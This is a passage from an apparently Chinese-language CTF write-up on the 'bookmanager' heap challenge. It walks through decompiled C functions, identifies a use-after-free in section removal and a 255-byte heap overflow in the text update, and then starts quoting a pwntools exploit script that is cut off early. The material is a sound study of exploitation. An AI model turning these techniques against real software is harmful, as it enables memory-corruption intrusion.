keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>通过chaptername定位到chapterchunk，然后依次将该chapterchunk下所有的textchunk，sectionchunk free并清零，最后将chapterchunk free并清零</p><h4 id="7-preview"><a href="#7-preview" class="headerlink" title="7.preview()"></a>7.preview()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">preview</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nBook:%s"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n  Chapter:%s"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n    Section:%s"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      Text:%s"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个功能就是show功能，从bookchunk开始，一级一级的输出所有chapter，section，text</p><h4 id="8-update"><a href="#8-update" class="headerlink" title="8.update()"></a>8.update()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">update</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-124h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-120h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-11Ch]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+138h] [rbp-8h]</span>  v9 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWhat to update?(Chapter/Section/Text):"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Chapter"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter name:"</span><span class="token punctuation">,</span> <span class="token string">"Chapter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>qword_20<span class="token punctuation">;</span>    <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>s<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNew Chapter name:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUpdated"</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNot found!"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_34<span class="token punctuation">:</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNothing has been done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Section"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">,</span> <span class="token string">"Section"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNew Section name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">40LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUpdated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token operator">++</span>v5<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>v4<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">goto</span> LABEL_34<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Text"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">,</span> <span class="token string">"Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNew Text:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUpdated"</span><span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token operator">++</span>v7<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>v6<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">goto</span> LABEL_34<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nInvalid!"</span><span class="token punctuation">,</span> <span class="token string">"Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>根据我们输入的是Chapter/Section/Text来判断我们要更新哪部分</p><p>这个功能其实没啥好讲的，也就是各种遍历，通过name来定位chapter/section/text，然后修改内容。</p><p>好了，到这里八个功能都分析完了，c语言的指针真是灵魂，从一个chunk指向另一个chunk，还可以继续指向下一个chunk，俄罗斯套娃。</p><p>那么，程序的漏洞在哪，第一个在remove_section()函数中，free了sectionchunk后并未清零，第二个在update()函数中，在更新text功能中，输入的size固定为255，这里就有堆溢出漏洞，整个程序的功能一大堆，看起来很复杂，但实际上利用起来很简单，只要仔细分析程序这两个洞也并不难找。</p><p>下面放出ex师傅的exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./bookmanager'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bookmanager'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('node3.buuoj.cn', 25525)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bookmanager'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_chapter</span><span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token 